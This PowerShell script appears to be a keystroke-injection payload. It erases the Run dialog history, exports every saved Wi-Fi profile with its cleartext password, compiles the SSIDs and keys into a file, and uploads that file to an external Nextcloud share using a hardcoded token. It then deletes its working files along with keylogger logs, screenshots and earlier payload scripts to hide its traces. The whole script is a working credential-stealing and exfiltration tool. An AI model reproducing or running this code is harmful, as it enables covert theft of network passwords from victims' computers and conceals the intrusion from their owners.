function Nextcloud-Upload {

[CmdletBinding()]
param (
	
[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
[Alias("f")]
[string]$SourceFilePath
) 

# Set security protocol to TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Define the File to Upload
$file = $SourceFilePath

# Define authentication information
$nextcloudUrl = "https://wim.nl.tab.digital/"
$sharetoken = 'gkj9TSrXtzxGrn4'

# Retrieve file object
$fileObject = Get-Item $file

# Define headers for HTTP request
$headers = @{
    "Authorization"=$("Basic $([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($("$($sharetoken):"))))");
    "X-Requested-With"="XMLHttpRequest";
}

# Construct URL for webdav endpoint
$webdavUrl = "$($nextcloudUrl)/public.php/webdav/$($fileObject.Name)"

# Upload file to Nextcloud server
Invoke-RestMethod -Uri $webdavUrl -InFile $fileObject.Fullname -Headers $headers -Method Put 
}


# Delete the history of run
cd HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\
Remove-Item .\RunMRU\


# All the files will be saved in this directory
$p = "C:\wipass"
mkdir $p
cd $p


# Get all saved wifi password
netsh wlan export profile key=clear
dir *.xml |% {
$xml=[xml] (get-content $_)
$a= "========================================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
Out-File "$env:computername-wificapture.txt" -Append -InputObject $a
}


"$env:computername-wificapture.txt" | Nextcloud-Upload

# Clear tracks
rm *.xml
rm *.txt
cd ..
rm wipass



$paths =  "$env:APPDATA\c.ps1", "$env:APPDATA\sg.ps1", "$env:APPDATA\sg2.ps1", "C:\Users\Irene\Desktop\OMG\testing\temp.txt", "$env:temp\keylogger.txt", "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture1.png"
foreach($filePath in $paths) {
	
    if (Test-Path $filePath) {
        Write-Host "Path removed: $filePath" 
        Remove-Item $filePath -verbose
    } else {
        Write-Host "Path $filePath doesn't exits"
    }
}

